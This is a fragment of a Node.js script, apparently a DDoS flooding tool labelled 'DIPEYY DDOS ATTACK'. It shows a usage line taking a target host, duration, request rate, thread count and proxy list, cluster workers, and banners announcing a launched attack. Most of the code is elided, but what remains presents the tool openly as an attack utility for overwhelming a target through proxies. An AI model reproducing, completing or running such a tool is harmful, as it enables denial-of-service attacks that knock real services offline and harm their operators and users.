...
const secureOptions =
 ...
 if (process.argv.length < 7){console.log(`Usage: node janda.js host time req thread proxy.txt`); process.exit();}
...
if (cluster.isMaster) {
    console.log("═════════════════════════════════════════════════════════════".gray);
    console.log(` DIPEYY DDOS ATTACK`.red.bold);
    console.log("═════════════════════════════════════════════════════════════".gray);
    ...
    console.log("═════════════════════════════════════════════════════════════".gray);
    console.log(` [!] Attack Target Launched Successfully`.brightRed);
    console.log("═════════════════════════════════════════════════════════════".gray);
    console.log("DIPEYY DDOS ATTACK | HIGH RQ/S METODE CUSTOM".yellow.bold);
